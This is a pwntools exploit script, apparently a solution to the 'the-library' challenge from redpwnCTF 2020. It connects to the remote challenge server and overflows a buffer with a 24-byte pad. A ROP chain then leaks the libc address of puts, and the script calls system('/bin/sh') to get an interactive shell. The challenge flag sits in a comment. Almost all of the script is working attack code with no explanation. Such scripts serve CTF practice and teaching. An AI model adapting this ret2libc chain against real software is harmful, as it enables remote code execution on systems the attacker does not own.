from pwn import *

#p=process("./the-library")
p=remote("2020.redpwnc.tf",31350)
elf=ELF("the-library")

#libc=elf.libc
libc = ELF("libc.so.6")
pause()
pop_rdi = 0x0000000000400733



payload = 'A'*24
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload +=p64(elf.got['puts'])
payload +=p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])
p.sendline(payload)

p.recvline()
p.recvline()
p.recvline()
leak_address = u64(p.recv(6).strip('').ljust(8,'\x00'))
log.info("LEAK -> "+hex(leak_address))

libc.address = leak_address - libc.symbols['puts']
log.info("LIBC -> "+hex(libc.address))

system = libc.symbols['system']
log.info("SYSTEM -> "+hex(system))
binsh = libc.search("/bin/sh\x00").next()
log.info("BINSH -> "+hex(binsh))

payload = 'A'*24
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
p.sendline(payload)
#flag{jump_1nt0_th3_l1brary}
p.interactive()